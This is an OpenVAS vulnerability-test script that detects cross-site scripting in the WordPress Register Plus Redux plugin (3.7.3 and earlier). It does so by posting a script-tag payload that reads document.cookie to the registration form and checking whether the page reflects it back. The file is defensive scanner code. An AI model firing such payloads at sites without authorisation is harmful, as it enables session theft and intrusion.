###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_register_plus_redux_mult_xss_vuln.nasl 3108 2016-04-19 06:58:41Z benallard $
#
# WordPress Register Plus Redux Plugin Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################################################################

tag_impact = "Successful exploitation could allow an attacker to execute
arbitrary HTML and script code in a user's browser session in the context
of an affected site.

Impact Level: Application";

tag_affected = "WordPress Register Plus Redux Plugin 3.7.3 and prior.";

tag_insight = "The flaws are due to,
- Improper validation of input passed via the 'user_login', 'user_email',
  'firstname', 'lastname', 'website', 'aim', 'yahoo', 'jabber', 'about',
  'password', and 'invitation_code' parameters to 'wp-login.php' (when
  'action' is set to 'register').
- A direct request to 'register-plus-redux.php' allows remote attackers to
  obtain installation path in error message.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running WordPress Register Plus Redux Plugin and is
prone to multiple vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802324";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3108 $");
  script_tag(name:"last_modification", value:"$Date: 2016-04-19 08:58:41 +0200 (Tue, 19 Apr 2016) $");
  script_tag(name:"creation_date", value:"2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)");
  script_bugtraq_id(45179);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress Register Plus Redux Plugin Multiple Cross-Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://websecurity.com.ua/4542/");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45503/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103773/registerplus373-xss.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_summary("Check if WordPress Register Plus Plugin Redux is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
wpPort = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!wpPort){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:wpPort)){
  exit(0);
}

## Get WordPress Directory
if(!wpDir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:wpPort))exit(0);


## Try an exploit
filename = string(wpDir + "/wp-login.php?action=register");
host = get_host_name();
authVariables = "user_login=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C" +
                "%2Fscript%3E&user_email=%22%3E%3Cscript%3Ealert%28document" +
                ".cookie%29%3C%2Fscript%3E&first_name=%22%3E%3Cscript%3Eale" +
                "rt%28document.cookie%29%3C%2Fscript%3E&last_name=%22%3E%3C" +
                "script%3Ealert%28document.cookie%29%3C%2Fscript%3E&url=&ai" +
                "m=&yahoo=&jabber=&description=&redirect_to=&wp-submit=Regi" +
                "ster";

## Construct post request
sndReq2 = string("POST ", filename, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                  authVariables);

rcvRes2 = http_keepalive_send_recv(port:wpPort, data:sndReq2);

## Check the response to confirm vulnerability
if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes2) &&
        ("><script>alert(document.cookie)</script>" >< rcvRes2))
{
  security_message(wpPort);
  exit(0);
}

